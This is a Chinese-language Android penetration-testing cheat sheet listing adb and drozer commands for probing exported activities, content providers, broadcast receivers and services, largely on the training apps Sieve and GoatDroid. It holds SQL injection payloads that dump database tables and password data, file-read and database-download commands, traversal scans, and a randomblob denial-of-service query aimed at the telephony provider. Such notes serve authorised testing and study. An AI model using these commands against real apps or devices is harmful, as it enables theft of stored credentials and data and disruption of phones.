# App渗透测试记录 

### 1. 常用命令  

1. 获取已安装应用的包名  

 		adb shell pm list packages  
 
2. 获取包名对应的APK路径
 
 		adb shell pm path com.vivo.sdkplugin 
3. 把APK pull到本地  

 		adb pull /data/app/com.vivo.sdkplugin-zvXOuWJKeKVhhESsKWxOxg==/base.apk abc.apk
4. aapt获取APK包的信息 
 
 		aapt dump badging apk_path  

5. 获取应用的信息  

 		adb shell dumpsys package <package_name>  

6. 获取当前运行的Activity   

		adb shell dumpsys activity | grep -i run   
 
7. 获取和用户正在交互的Activity  
 
 		adb shell dumpsys activity  | grep "mFoc"
 		

### 2. drozer使用  

1. adb forward tcp:31415 tcp:31415  
2. adb console connect  
3. run app.package.list 
4. run app.package.list -f sieve 
5. run app.package.info -a com.mwr.example.sieve  
6. 检查攻击面：  
 
 		run app.package.attacksurface com.mwr.example.sieve  
 
#### 1. Activity测试  
1. 查看activity信息：  

 		run app.activity.info -a com.mwr.example.sieve

2. 启动activity信息：  
	1. Activity通常就是一个单独的屏幕，可以显示一些控件也可以监听并处理用户的的事件最初响应；   
 	2. Activity之间通过Intent进行通信，最重要的部分：动作和动作对应的数据  
 	3. 越权访问问题  

			run app.activity.start –-component com.mwr.example.sieve com.mwr.example.sieve.PWList  
	4. 翻译编译代码，确定activity需要传递的参数，启动activity：  
			
			run app.activity.start --component com.example.pacakge com.example.activity --extra string package strvalue --extra string appid appidvalue    


#### 2. Provider测试  
1. 查看content provider信息  

 		run app.provider.info -a com.mwr.example.sieve  

2. 查找可以访问的content provider的URI  
	1. 最好需要打开应用程序，保证应用程序在运行  
	2. 数据泄露  

 			run scanner.provider.finduris -a com.mwr.example.sieve

 	3. 查询、修改数据：  
 		
 			run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ –-vertical
 			
3. 进行SQL注入  

	1. SQLite数据库使用SQL语句，所以进行SQL注入，使用projection参数和selection参数可以传递一些简单点得SQL注入语句，获取到详细的报错信息：    
 
  			run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "'"   

  			run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection "'" 
   
	2. 查询所有数据库表：  
  
  			run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "* FROM SQLITE_MASTER WHERE TYPE='table';-- "   
  
 	3. 列出数据库内容：
 
  			run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "* FROM Key;-- "   
    
4. 扫描注入：
 
  		run scanner.provider.injection -a APP
  
5. 从File Content Providers获取信息：    
 	1. File System-backed Content Provider提供了访问底层文件系统的方法，Android沙盒会阻止App共享文件允许，而File System-backed Content Provider允许App共享文件。 
 	2. 对于sieve来说，我们可以推测出的FileBackupProvider就是一个file system-backed content provider。 我们可以使用drozer的app.provider.read模块查看某个文件：
  
  			run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts  
6. 文件下载：
 
  		run app.provider.download content://com.mwr.example.sieve.FileBackupProvider/data/data/com.mwr.example.sieve/databases/database.db /home/user/database.db  

7. 检查是否存在遍历文件漏洞
 
  		run scanner.provider.traversal -a com.mwr.example.sieve   
 
8. 本地拒绝服务测试  
	
		run app.provider.query content://telephony/siminfo/ --selection "_id=LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))"
	
 
#### 3. Broadcast测试：  
	
BroadcastReceive广播接收器应用可以使用它对外部事件进行过滤只对感兴趣的外部事件(如当电话呼入时，或者数据网络可用时)进行接收并做出响应。广播接收器没有用户界面。然而，它们可以启动一个activity或serice 来响应它们收到的信息，或者用NotificationManager来通知用户。通知可以用很多种方式来吸引用户的注意力──闪动背灯、震动、播放声音等。一般来说是在状态栏上放一个持久的图标，用户可以打开它并获取消息。   

1. 查看暴露的广播组件信息：
 
  		run app.broadcast.info -a com.package.name  
 
    
2.  发送信息：
 
  		run app.broadcast.send --component packagename receivername --action android.intent.action.XXX

    
3.  空action：
 
  		run app.broadcast.send --component packagename ReceiverName
  
4. 空extras:
 
  		run app.broadcast.send --action android.intent.action.XXX

#### 4. service测试：  

1. 获取service：
  
  		run app.service.info -a com.mwr.example.sieve
  
2. 向某个服务发送信息：
 
  		run app.service.send com.mwr.example.sieve com.mwr.example.sieve.CryptoService –msg 1 5 3
3. 启动service：
 
  		run app.service.start --action org.owasp.goatdroid.fourgoats.services.LocationService --component org.owasp.goatdroid.fourgoats org.owasp.goatdroid.fourgoats.services.LocationService
  
4. 使用命令：  
  
  		run app.service.send <package name> <component name> --msg <what> <arg1> <arg2> --extra <type> <key> <value> --bundle-as-obj
  		
 